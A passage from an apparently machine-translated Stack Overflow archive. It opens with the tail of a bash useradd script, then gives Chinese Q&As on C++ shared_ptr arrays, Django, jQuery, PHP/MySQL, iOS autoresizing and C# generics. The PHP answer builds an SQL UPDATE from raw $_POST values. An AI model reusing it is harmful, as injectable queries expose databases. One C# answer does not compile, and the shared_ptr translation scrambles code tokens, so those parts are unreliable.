    echo "This script must be ran as root"
    exit 1
fi

#Get the new users Name
#echo -n "Please enter the users First and Last Name and press [ENTER]: "
#read Name

#Get the new users username
echo "The username must be 4-20 characters."
echo -n "Please enter the users requested username and press [ENTER]: "
read USERNAME
while [ $(grep -c "^${USERNAME}:" /etc/passwd) -ge 1 ] || [ ${#USERNAME} -le 3 ] || [ ${#USERNAME} -ge 21 ]
do
    echo " "
    echo "Error: Username is in use or invalid.  Please select a different username."
    echo " "
    echo -n "Please enter the users requested username and press [ENTER]: "
    read USERNAME   
done #USERNAME will be valid from this point

#ASK about the default shell now
echo -n "Enter the new shell if you would like one (currently $SHELL) or leave blank for the default and press [ENTER]: "
read tempSHELL
if [ ${#tempSHELL} -ge 1 ]; then
    SHELL="$tempSHELL"
    FINALCOMMAND="$FINALCOMMAND ""-s $SHELL"
fi

#ASK about a different primary group
echo "Would you like to enter a non-default primary user group? Defaults to creating a new group that matches the username"
echo "Enter a new Primary Group or leave blank for the default and press [ENTER]: "
read newPrimaryGroup

if [ ${#newPrimaryGroup} -eq 0 ]; then
    FINALCOMMAND="$FINALCOMMAND --user-group"
else
    if [ $(grep -c "^${newPrimaryGroup}" /etc/group) -ge 1 ]; then
        FINALCOMMAND="$FINALCOMMAND -g $newPrimaryGroup"
    else
        echo "Invalid group specified reverting to default!"
        FINALCOMMAND="$FINALCOMMAND --user-group"
    fi
fi
#useradd -m --user-group jaredm2
#ASK about additional groups
echo "Would you like the new user to be a part of any additional groups?  Leave blank if no additional groups are needed or enter additional groups in the format of GROUP1,GROUP2,... (NO SPACES) and press [ENTER]: "
read extraGroups
#remove spaces if the user entered any
extraGroups="${extraGroups//[[:space:]]}"
FINALEXTRAGROUPS=""
#IFS=","
for g in $extraGroups
do
    if [ $(grep -c "^${g}" /etc/group) -ge 1 ]; then
        FINALEXTRAGROUPS="$FINALEXTRAGROUPS,$g"
    else
        echo "$g is invalid user will not be added..."
    fi
done
FINALEXTRAGROUPS=$(echo "$FINALEXTRAGROUPS" | tail -c +2)
if [ ${#FINALEXTRAGROUPS} -ge 1 ]; then
    FINALCOMMAND="$FINALCOMMAND -G $FINALEXTRAGROUPS"
fi

#ASK about the home directory
echo "Would you like to enter a new home directory for the user?  Leave blank to use the default of $HOME/$USERNAME or enter your own and press [ENTER]: "
read NEWHOME

if [ ${#NEWHOME} -ge 1 ]; then
    FINALCOMMAND="$FINALCOMMAND -d $NEWHOME"
fi

#ADD the username to the command
FINALCOMMAND=`echo "$FINALCOMMAND $USERNAME" | sed 's/ *$//g' | sed 's/^ *//g'`
echo "useradd $FINALCOMMAND"
#PASSCOMMAND="sudo passwd $USERNAME"
#ADD THE USER
useradd $FINALCOMMAND

passwd $USERNAME

chfn $USERNAME 
```

# c++ - shared_ptr 到一个数组：应该使用它吗？

> ID：13061979
> 
> 赞同：191
> 
> 时间：2012-10-25T05:13:00.033
> 
> 标签：c++, c++11, shared-ptr

只是一个关于[`shared_ptr`](http://en.cppreference.com/w/cpp/memory/shared_ptr).

`shared_ptr`使用指向数组是一种好习惯吗？例如，

```
shared_ptr<int> sp(new int[10]); 
```

如果不是，那为什么不呢？我已经知道的一个原因是不能增加/减少`shared_ptr`. 因此它不能像普通的指向数组的指针一样使用。

* * *

## 回答 #1

> 赞同：297
> 
> 时间：2012-10-25T05:21:40.800

使用**C++17**，`shared_ptr`可用于管理动态分配的数组。在这种情况下，`shared_ptr`模板参数必须是`T[N]`or `T[]`。所以你可以写

```
shared_ptr<int[]> sp(new int[10]); 
```

从 n4659，[[util.smartptr.shared.const]](https://timsong-cpp.github.io/cppwp/n4659/util.smartptr.shared.const)

> ```
>  template<class Y> explicit shared_ptr(Y* p); 
> ```
> 
> *Requires:* `Y`必须是一个完整的类型。表达式`delete[] p`, when`T`是数组类型，或者`delete p`, when`T`不是数组类型，应具有明确定义的行为，并且不应抛出异常。
> ...
> *备注：*当`T`是数组类型时，此构造函数不应参与重载决议，除非表达式`delete[] p`是格式正确的并且要么`T`is`U[N]`并且`Y(*)[N]`可转换为`T*`，要么`T`is `U[]`并且`Y(*)[]`可转换为`T*`。...

为了支持这一点，成员类型[`element_type`](https://timsong-cpp.github.io/cppwp/n4659/util.smartptr.shared#1)现在定义为

```
using element_type = remove_extent_t<T>; 
```

数组元素可以使用[`operator[]`](https://timsong-cpp.github.io/cppwp/n4659/util.smartptr.shared.obs#8)

> ```
>  element_type& operator[](ptrdiff_t i) const; 
> ```
> 
> *要求：* `get() != 0 && i >= 0`。如果`T`是`U[N]`, `i < N`. ...
> *备注：*当`T`不是数组类型时，不指定是否声明该成员函数。如果它被声明，它的返回类型是什么是未指定的，除了函数的声明（虽然不一定是定义）应该是格式良好的。

* * *

**在 C++17 之前****，不能**用于`shared_ptr`管理动态分配的数组。默认情况下，当不再有对托管对象的引用时，将调用托管对象。但是，当您分配 using 时，您需要调用而不是调用来释放资源。**`shared_ptr``delete``new[]``delete[]``delete`**

 **为了正确使用`shared_ptr`数组，您必须提供自定义删除器。

```
template< typename T >
struct array_deleter
{
  void operator ()( T const * p)
  { 
    delete[] p; 
  }
}; 
```

创建 shared_ptr 如下：

```
std::shared_ptr<int> sp(new int[10], array_deleter<int>()); 
```

现在将在销毁托管对象时`shared_ptr`正确调用。`delete[]`

上面的自定义删除器可以替换为

*   [`std::default_delete`](http://en.cppreference.com/w/cpp/memory/default_delete)数组类型的部分特化

    ```
    std::shared_ptr<int> sp(new int[10], std::default_delete<int[]>()); 
    ```

*   一个 lambda 表达式

    ```
    std::shared_ptr<int> sp(new int[10], [](int *p) { delete[] p; }); 
    ```

此外，除非您确实需要托管对象的共享权限，否则 a`unique_ptr`更适合此任务，因为它具有数组类型的部分特化。

```
std::unique_ptr<int[]> up(new int[10]); // this will correctly call delete[] 
```

* * *

### C++ Extensions for Library Fundamentals 引入的变化

[Library Fundamentals Technical Specification](http://en.cppreference.com/w/cpp/experimental/lib_extensions)提供了上面列出的另一个 C++17 之前的替代方案，它进行了扩充`shared_ptr`，使其能够在拥有对象数组的情况下开箱即用。`shared_ptr`可在[N4082](http://www.open-std.org/JTC1/SC22/WG21/docs/papers/2014/n4082.pdf)中找到为此 TS 计划的当前更改草案。这些更改将可通过`std::experimental`命名空间访问，并包含在`<experimental/memory>`标头中。`shared_ptr`支持数组的一些相关更改是：

— 成员类型的定义`element_type`改变

> ~~typedef T element_type;~~
> 
> ```
>  typedef typename remove_extent<T>::type element_type; 
> ```

—`operator[]`正在添加成员

> ```
>  element_type& operator[](ptrdiff_t i) const noexcept; 
> ```

— 与`unique_ptr`数组的部分特化不同，两者都是有效的，`shared_ptr<T[]>`并且`shared_ptr<T[N]>`都将导致在`delete[]`对象的托管数组上被调用。

> ```
>  template<class Y> explicit shared_ptr(Y* p); 
> ```
> 
> *Requires* :`Y`应该是一个完整的类型。表达式`delete[] p`, when`T`是一个数组类型，或者`delete p`, when`T`不是一个数组类型，应该是格式良好的，应该有明确定义的行为，并且不应该抛出异常。`T`什么时候`U[N]`,`Y(*)[N]`应转换为`T*`; 什么时候,应转换`T`为; 否则，应转换为.`U[]``Y(*)[]``T*``Y*``T*`

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2013-10-03T13:03:03.437

您可能可以使用的一个可能更简单的替代方法是`shared_ptr<vector<int>>`.**

# django - url中的问号问题

> ID：13061981
> 
> 赞同：3
> 
> 时间：2012-10-25T05:13:20.723
> 
> 标签：django, url, django-urls

嗨，我在我的应用程序中使用多种语言，可以通过 url 访问它，比如`www.asd.com/reg/?lang=es` 有什么方法可以删除这个**“？”** 从我的网址开始，它变得像`www.asd.com/reg/es` 我的多语言功能正常工作。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:23:44.487

当您使用 访问 url 时`?lang=es`，您将在视图中获得一个以`lang`value命名的参数。`es`这是通用的 HTTP url 方案。

使用 django，可以使用适当的 url 模式来完成类似的事情。例如：

```
url(r'^reg/(?P<lang>[\w]+)$', 'your_app.views.view_func',), 
```

并且在视图中

```
def view_func(request, lang=None):
    ...
    # lang will have value passed.
    # do your stuff 
```

因此，当您访问时`www.asd.com/reg/es`，参数`lang`将`es`在您的视图中具有价值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T09:09:00.527

Django 1.4 原生支持此类 URL - [`i18n_patterns`](https://docs.djangoproject.com/en/1.4/topics/i18n/translation/#django.conf.urls.i18n.i18n_patterns). 据我了解，有一个名为的应用程序，[`django-i18nurls`](http://pypi.python.org/pypi/django-i18nurls/)但它已包含在 django 核心中

您也可以为此使用[`django-localeurl`](http://packages.python.org/django-localeurl/)应用程序（[可在 BitBucket 获得](https://bitbucket.org/carljm/django-localeurl/)）。它有一个中间件，可以修补`request.path`和 django 的`reverse`功能来实现区域设置 URL。也许这个应用程序有替代品

但是，此解决方案将为您提供格式的 URL`www.asd.com/es/reg/`

# jquery - 如何使用 jquery 获取同一类的下一个职位

> ID：13061988
> 
> 赞同：0
> 
> 时间：2012-10-25T05:14:18.550
> 
> 标签：jquery

如何使用 jquery 获得同一类的下一个位置，

我正在尝试此代码，但在下次单击时不起作用

```
var directiveScrollTop= $(".site_section").next().position().top; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T05:26:46.487

如果您正在处理某个元素并且需要使用 class 查找下一个元素`site_section`：

```
$(this).nextAll(".site_section") 
```

所以你的代码应该是：

```
var directiveScrollTop= $(this).nextAll(".site_section").position().top; 
```

不过，它们需要在 DOM 中处于相同的深度。

# php - 如何更新多输入文本 mySQL

> ID：13061994
> 
> 赞同：1
> 
> 时间：2012-10-25T05:14:39.177
> 
> 标签：php, mysql

对不起我的英语不好 ！我有一个有一个问题和 4 个答案的投票系统：

```
Answer_id   Question_id   answers     vote
   10           1           ball        1
   11           1           radio       3
   12           1           tv          5
   13           1           car         8 
```

我有 4 个输入文本来输入用户使用投票投票的答案：

```
<input type="text" name="ans1" id="ans1"/>
<input type="text" name="ans2" id="ans2"/>
<input type="text" name="ans3" id="ans3"/>
<input type="text" name="ans4" id="ans4"/> 
```

当我想更新答案时，我该如何查询？感谢您回答我的问题：D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:33:11.423

您应该在表单标签内拥有所有输入以及提交按钮。同样在表单标签内，有一个隐藏的输入，它将包含问题的 id 作为值。当您单击提交时，它将发布所有输入，包括隐藏输入。在处理页面（表单操作页面）中，获取隐藏输入的值（您将在查询的 where 子句中需要它）。然后按以下方式编写更新查询。

您肯定不想更新所有 4 个答案，而只更新一个答案，因为每个问题只有一个答案。假设您的表名是问题：

```
$ans1 = $_POST['ans1'];
$ans2 = $_POST['ans2'];
$ans3 = $_POST['ans3'];
$ans4 = $_POST['ans4'];

if(!empty($ans1))$answer = $ans1;
else if(!empty($ans2))$answer = $ans2;
else if(!empty($ans3))$answer = $ans3;
else if(!empty($ans4))$answer = $ans4;
$id = $_POST['id']; //This is coming from the hidden input box
$updateSQL = mysql_query("UPDATE questions SET answers = '$answer' WHERE Question_id= '$id'); 
```

如果您可以检查用户是否没有通过 javascript 输入所有 4 个答案，那也将是一件好事。您确定需要更新查询而不是插入查询吗？这也可以通过jquery（ajaxed方式）来完成，但你没有提到你想怎么做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:27:05.603

在输入文本字段的 id 中，用表的主键 (AnswerId)+sometext 重写它。当您保存或更新答案时，查询将如下所示：

```
update table set answers    =$$text where answerId =AnswerId(id of the input text) 
```

# iphone - 用于 iPhone 5 设计的自动调整蒙版？

> ID：13061996
> 
> 赞同：3
> 
> 时间：2012-10-25T05:14:43.433
> 
> 标签：iphone, ios

我正在使用 Xcode 4.5 开发新应用程序，并将部署目标用于 iOS 4.3。应用程序应该支持 iphone 5 和 iPhone 4。我用谷歌搜索设计 iPhone 5 和 iPhone 4 并看到以下网址。

[iOS 6 应用程序 - 如何处理 iPhone 5 的屏幕尺寸？](https://stackoverflow.com/questions/12396545/ios-6-apps-how-to-deal-with-iphone-5-screen-size)

我们可以为 iPhone 5 和 iPhone 4 设计使用 autoresizingmask。我为 iPhone 5 和 iPhone 4 做了一些屏幕设计。但是，我有一个疑问。autoresizingmask 是否也可用于 iPhone5？我只用过 iPhone 4。需要验证以下代码。请帮助我。

```
if ([[UIScreen mainScreen] bounds].size.height < 568) {
    topView.autoresizingMask = UIViewAutoresizingFlexibleTopMargin | 
                               UIViewAutoresizingFlexibleBottomMargin | 
                               UIViewAutoresizingFlexibleLeftMargin | 
                               UIViewAutoresizingFlexibleRightMargin |  
                               UIViewAutoresizingFlexibleWidth | 
                               UIViewAutoresizingFlexibleHeight ;
} 
```

上面的代码对吗？或者自动调整大小也应该使用 iPhone 5？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:19:51.900

如果您希望视图顶部*固定*到所有四个侧面并调整其宽度和高度，那么您应该只使用：

```
UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight 
```

请注意，代码中的自动调整大小表示边距应该是*灵活*的，而检查员说它们应该是*固定*的。省略灵活边距意味着边距是固定的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:20:00.637

iPhone 5（或任何运行 iOS 6 的设备）将为您将这些掩码转换为自动布局约束，并且可能会在不再支持 iOS 5.x 之前。

# c# - 如何处理泛型返回 T 的异常

> ID：13061998
> 
> 赞同：2
> 
> 时间：2012-10-25T05:14:51.143
> 
> 标签：c#, .net, generics, exception-handling, default

如果函数体中发生异常，如何返回新的空类型 T？

如果在反序列化 xml 时出现问题，将 x 转换为新 T() 的最佳方法是什么？

看看我是如何得到 catch 块的，我将如何处理这个？

```
 public static T DeserializeXml<T>(this string xml) where T : class
    {

        XmlDocument doc = new XmlDocument();
        MemoryStream ms = new MemoryStream();
        StreamReader sr = null;
        T x = null;
        //
        try
        {
            doc.LoadXml(xml); doc.Save(ms);
            ms.Position = 0;
            sr = new StreamReader(ms);
            XmlSerializer i = new XmlSerializer(typeof(T));
            x = (T)i.Deserialize(sr);
        }
        catch (Exception) {
            x = null;
        }
        finally {
        sr.Close(); sr.Dispose(); ms.Close(); ms.Dispose();
        }
        //
        return x as T;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T05:18:45.483

你可以使用[默认值](http://msdn.microsoft.com/en-us/library/xwth0h0d%28v=vs.80%29.aspx)。

```
return default(T); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T05:18:55.967

您可以约束`T`拥有一个空的构造函数。你问的是这个吗？

```
public static T DeserializeXml<T>(this string xml) where T : class, new()
{
    //...
    catch
    {
        x = new T();
    }
    //...
    return x as T;       
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-25T05:18:57.290

你真正需要做的就是

```
catch (Exception) {
    x = default(T);
} 
```

或类似的东西。真的，你可以只`return` `null`在`catch`子句中；除非您拔下电源插头，否则该`finally`子句仍保证运行，并且`where T: class`约束确保 default(T) 始终为空。

考虑使用一些`using`块，而不是那些关闭和处置。然后你根本不需要一个`finally`块。

```
public static T DeserializeXml<T>(this string xml) where T : class
{

    XmlDocument doc = new XmlDocument();
    using (MemoryStream ms = new MemoryStream())
    {
        using (StreamReader sr = new XmlSerializer(typeof(T))
        {
            T x = null;

            try
            {
                doc.LoadXml(xml); doc.Save(ms);
                ms.Position = 0;
                sr = new StreamReader(ms);
                XmlSerializer i = new XmlSerializer(typeof(T));
                x = (T)i.Deserialize(sr);
            }
            catch (Exception) {
                return null;
            }
        }
    }
    return x;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-25T05:19:02.120

您可以返回`default(T)`，也可以向泛型类型添加约束`where T : new()`，在这种情况下，您可以返回`new T()`。

基本上，`default(T)`适用于您不知道`T`是值类型还是引用类型的情况。它为不同的类型返回不同的东西——类的 null ，数字类型的零和结构的空实例。[MSDN 上](http://msdn.microsoft.com/en-us/library/xwth0h0d.aspx)有一篇很好的文章。